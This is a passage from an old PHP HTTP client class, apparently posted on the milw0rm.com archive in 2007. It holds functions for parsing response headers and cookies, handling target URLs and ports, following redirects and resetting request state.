		$onlyheader = $header[0].&quot;\n&quot;;
		for($i=1;$i&lt;count($header);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$header[$i])) break;
			$onlyheader .= $header[$i].&quot;\n&quot;;
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the &quot;Set-Cookie&quot; header in the &quot;Cookie&quot;
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode(&quot;\n&quot;,str_replace(&quot;\r\n&quot;,&quot;\n&quot;,$code));
		for($z=0;$z&lt;count($carr);$z++)
		{
			if(preg_match(&quot;/set-cookie: (.*)/i&quot;,$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace(&quot;/expires=(.*)(GMT||UTC)(\S*)$/i&quot;,&quot;&quot;,preg_replace(&quot;/path=(.*)/i&quot;,&quot;&quot;,$cookarr[1]));
			}
		}

		for($i=0;$i&lt;count($cookie);$i++)
		{
			preg_match(&quot;/(\S*)=(\S*)(|;)/&quot;,$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this-&gt;addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match(&quot;/^http:\/\/(.*)\//&quot;,$urltarg)) $urltarg .= &quot;/&quot;;
		$this-&gt;url=$urltarg;
		
		$array = explode(&quot;/&quot;,str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg)));
		$this-&gt;host=$array[0];

		preg_match(&quot;/:(\d+)\//&quot;,$urltarg,$matches);
		$this-&gt;port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg));
		preg_match(&quot;/\/(.*)\//&quot;,$temp,$matches);
		$this-&gt;path=str_replace(&quot;//&quot;,&quot;/&quot;,&quot;/&quot;.$matches[1].&quot;/&quot;);
	
		if($this-&gt;port &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all &quot;Set-Cookie&quot; headers values
	 * and it will automatically add them into the &quot;Cookie&quot; header
	 * for all next requests.
	 *
	 * $this-&gt;cookiejar(1); // enabled
	 * $this-&gt;cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this-&gt;cookiejar='';
		if($code===1) $this-&gt;cookiejar=1;
		else
		{
			$this-&gt;getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this-&gt;allowredirection(1); // enabled
	 * $this-&gt;allowredirection(0); // disabled
	 * 
	 * @return $this-&gt;get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this-&gt;allowredirection='';
		if($code===1) $this-&gt;allowredirection=1;
		else
		{
			if(preg_match(&quot;/(location|content-location|uri): (.*)/i&quot;,$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi(&quot;://&quot;,$location))
				{
					return $this-&gt;get(&quot;http://&quot;.$this-&gt;host.$this-&gt;path.$location);
				}
				else
				{
					return $this-&gt;get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this-&gt;reset(header); // headers cleaned
	 * $this-&gt;reset(cookie); // cookies cleaned
	 * $this-&gt;reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case &quot;header&quot;:
			$this-&gt;header='';
			break;
			
			case &quot;cookie&quot;:
			$this-&gt;cookie='';
			break;
			
			default:
		        $this-&gt;cookiejar='';
		        $this-&gt;header='';
		        $this-&gt;cookie='';
		        $this-&gt;allowredirection=''; 
		        $this-&gt;agent='';
		        break;
		}
	}
}
?&gt;

# milw0rm.com [2007-04-11]</pre></html>